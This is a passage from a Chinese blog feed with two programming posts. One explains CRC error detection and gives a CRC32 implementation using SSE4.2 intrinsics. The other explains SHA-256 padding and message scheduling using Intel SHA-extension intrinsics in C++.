    <content type="html"><![CDATA[<h2 id="模二运算"><a href="#模二运算" class="headerlink" title="模二运算"></a>模二运算</h2><p>CRC算法核心是模二运算，模二运算加法不进位，减法不借位，可看作异或运算</p><blockquote><p>&#x2F;&#x2F;不进位<br>1101 + 0001 &#x3D; 1100<br>&#x2F;&#x2F;不借位<br>1100 - 0001 &#x3D; 1101</p></blockquote><p><img src="/articles/simdcrc/1.png"></p><p><img src="/articles/simdcrc/2.png"></p><h2 id="CRC算法"><a href="#CRC算法" class="headerlink" title="CRC算法"></a>CRC算法</h2><p>数据链路层广泛使用循环冗余码（CRC）检错技术</p><p>CRC算法步骤：</p><blockquote><p>设原始数据为D，除数为P，多项式的阶为r，余数为R，实际发送的数据为T</p><p>1.收发双方约定生成多项式G(x)（最高位和最低位必须为1）。k位位串可视为阶数为k-1的多项式的系数序列。例如，1101用多项式表示就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>⋅</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo>⋅</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>0</mn><mo>⋅</mo><msup><mi>x</mi><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo>⋅</mo><msup><mi>x</mi><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">1 \cdot x^{3} + 1 \cdot x^{2} + 0 \cdot x^{1} + 1 \cdot x^{0} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span></p><p>2.发送方基于数据和G(x)，计算出冗余码，将冗余码附加到数据最后一起发送</p><blockquote><p>加0：G(x)有几阶就加几个0，可看作左移&lt;&lt;运算</p><p>计算冗余码： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mi>r</mi></msup><mi>D</mi><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">R = (2^{r}D) mod P </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> </p><p>附加冗余码： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mi>r</mi></msup><mi>D</mi><mo stretchy="false">)</mo><mo>⨁</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">T = (2^{r}D) ⨁ R </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⨁</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p></blockquote><p>3.接收方收到数据和冗余码后，通过G(x)检错</p><blockquote><p>如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>P</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">T mod P = 0 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>则无差错</p></blockquote></blockquote><p>通俗一点解释就是：选择一个数，用数据模二除这个数，得到的余数就是冗余码，附加到数据最后。接收方将收到的数据模二除选择的数，余数为0则无差错</p><p><strong>做个题加深理解（笑</strong></p><p>【2023统考真题】甲向乙发送数据，使用CRC算法，生成多项式为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">G(x) = x^{4} + x + 1 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，则乙方接收到比特串( D )时，可以断定无错误</p><p>A.101110000</p><p>B.101110100</p><p>C.101111000</p><p>D.101111100</p><p>解析：</p><p>注意到：ABCD前5位都是10111，所以可断定数据部分为10111</p><p>如果没有注意到：多项式的阶为4，所以冗余码占4位，那么数据就有5位，为10111</p><p>根据所给多项式，可知除数为10011，算出冗余码为1100，故选D</p><h2 id="SIMD-SSE4-2实现CRC32"><a href="#SIMD-SSE4-2实现CRC32" class="headerlink" title="SIMD SSE4.2实现CRC32"></a>SIMD SSE4.2实现CRC32</h2><p>SSE4.2指令集提供了四个指令用于计算CRC32，生成多项式为0x1EDC6F41</p><p>第一个操作数提供初始值，累计第二个操作数的CRC32值，返回结果</p><p><img src="/articles/simdcrc/3.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title">crc32</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, <span class="hljs-type">uint32_t</span> init_crc = <span class="hljs-number">0xffffffff</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; size;) &#123;<br>        <span class="hljs-type">size_t</span> remaining = size - offset;<br>        <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">8</span>) &#123;<br>            init_crc = _mm_crc32_u64(init_crc, *(<span class="hljs-type">uint64_t</span>*)(data + offset));<br>            offset += <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">4</span>) &#123;<br>            init_crc = _mm_crc32_u32(init_crc, *(<span class="hljs-type">uint32_t</span>*)(data + offset));<br>            offset += <span class="hljs-number">4</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">2</span>) &#123;<br>            init_crc = _mm_crc32_u16(init_crc, *(<span class="hljs-type">uint16_t</span>*)(data + offset));<br>            offset += <span class="hljs-number">2</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">1</span>) &#123;<br>            init_crc = _mm_crc32_u8(init_crc, *(data + offset));<br>            offset += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> init_crc ^ <span class="hljs-number">0xffffffff</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint8_t</span> data[] = &#123;<span class="hljs-string">&quot;test&quot;</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> crc = <span class="hljs-built_in">crc32</span>(data, <span class="hljs-number">4</span>); <span class="hljs-comment">//0x86a072c0</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>密码学</tag>
      
      <tag>考研408</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【编程】SIMD SHA指令集加速sha256计算</title>
    <link href="/articles/simdsha256/"/>
    <url>/articles/simdsha256/</url>
    
    <content type="html"><![CDATA[<p>intel的SHA指令集提供了六个指令用于加速SHA计算</p><p>这里只实现sha256</p><p><img src="/articles/simdsha256/1.png"></p><p>sha256计算步骤：<code>填充 -&gt; 消息调度 -&gt; 压缩</code></p><p>将消息长度填充到512的整倍数</p><p>一次迭代处理512比特，将512比特调度到64个32比特字，再将字压缩到状态向量<code>(A, B, C, D, E, F, G, H)</code>中</p><p>初始状态向量为常数，8个分量每个分量4字节大</p><p>SHA指令一次最多处理128位，所以需要按照压缩函数循环移位机制，交替更新<code>(A, B, E, F)</code>和<code>(C, D, G, H)</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//ABEF</span><br>_mm_set_epi32(<span class="hljs-number">0x6a09e667</span>, <span class="hljs-number">0xbb67ae85</span>, <span class="hljs-number">0x510e527f</span>, <span class="hljs-number">0x9b05688c</span>);<br><br><span class="hljs-comment">//CDGH</span><br>_mm_set_epi32(<span class="hljs-number">0x3c6ef372</span>, <span class="hljs-number">0xa54ff53a</span>, <span class="hljs-number">0x1f83d9ab</span>, <span class="hljs-number">0x5be0cd19</span>);<br></code></pre></td></tr></table></figure><h1 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h1><p>在消息末尾添加一个1比特</p><p>添加若干个0比特，直到消息长度满足 <code>长度 ≡ 448 mod 512</code></p><p>最后添加一个64位的无符号整数（大端序表示），表示原始消息的长度（以比特为单位）</p><p>添加原始消息长度的目的：防止长度扩展攻击</p><p>最后一块长度小于448比特，直接填充满就行</p><p>最后一块长度大于等于448比特，需要填充到另起一块以确保有足够的空间存放原始消息长度</p><h1 id="消息调度"><a href="#消息调度" class="headerlink" title="消息调度"></a>消息调度</h1><p>消息调度：将输入的512比特块拓展为64个32比特的字</p><p>前16个字无需计算，直接分解512比特块便是</p><p>其余的字用消息调度公式计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>t</mi></msub><mo>=</mo><msub><mi>σ</mi><mn>1</mn></msub><mo stretchy="false">(</mo><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>2</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>7</mn></mrow></msub><mo>+</mo><msub><mi>σ</mi><mn>0</mn></msub><mo stretchy="false">(</mo><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>15</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>16</mn></mrow></msub></mrow><annotation encoding="application/x-tex">W_t = \sigma_1(W_{t-2}) + W_{t-7} + \sigma_0(W_{t-15}) + W_{t-16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">15</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">16</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></p><p><code>_mm_sha256msg1_epu32</code>实现了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mn>0</mn></msub><mo stretchy="false">(</mo><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>15</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>16</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_0(W_{t-15}) + W_{t-16} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">15</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">16</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></p><p><img src="/articles/simdsha256/2.png"></p><p><code>_mm_sha256msg2_epu32</code>实现了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mn>1</mn></msub><mo stretchy="false">(</mo><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>2</mn></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_1(W_{t-2})  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><img src="/articles/simdsha256/3.png"></p><p><code>_mm_sha256msg1_epu32</code>计算结果加上 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mrow><mi>t</mi><mo>−</mo><mn>7</mn></mrow></msub></mrow><annotation encoding="application/x-tex">W_{t-7} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 传入<code>_mm_sha256msg2_epu32</code>中便是最终的调度字</p><p>处理调度字时，需要对寄存器进行重拼接</p><p><code>_mm_alignr_epi8(a, b, imm)</code>：拼接a和b，a在高b在低。拼接后的256位数据中，从第imm个字节开始，提取128位作为返回值</p><p>以下为示例代码</p><p>加载数据，作为前16个起始调度字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//加载数据，并进行重排运算将小端序转为大端序</span><br><span class="hljs-type">const</span> __m128i MASK = _mm_set_epi64x(<span class="hljs-number">0x0c0d0e0f08090a0bULL</span>, <span class="hljs-number">0x0405060700010203ULL</span>);<br><span class="hljs-comment">// W[3:0]</span><br>__m128i MSG0 = _mm_shuffle_epi8(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i*)(data + <span class="hljs-number">0</span>)), MASK);<br><span class="hljs-comment">// W[7:4]</span><br>__m128i MSG1 = _mm_shuffle_epi8(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i*)(data + <span class="hljs-number">16</span>)), MASK);<br><span class="hljs-comment">// W[11:8]</span><br>__m128i MSG2 = _mm_shuffle_epi8(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i*)(data + <span class="hljs-number">32</span>)), MASK);<br><span class="hljs-comment">// W[15:12]</span><br>__m128i MSG3 = _mm_shuffle_epi8(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i*)(data + <span class="hljs-number">48</span>)), MASK);<br></code></pre></td></tr></table></figure><p>调用<code>_mm_alignr_epi8(MSG3, MSG2, 4)</code>获取W[12:9]，并计算W[19:16]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// W[19:16]</span><br>MSG0 = _mm_sha256msg2_epu32(_mm_add_epi32(_mm_sha256msg1_epu32(MSG0, MSG1), _mm_alignr_epi8(MSG3, MSG2, <span class="hljs-number">4</span>)), MSG3);<br></code></pre></td></tr></table></figure><h1 id="压缩"><a href="#压缩" class="headerlink" 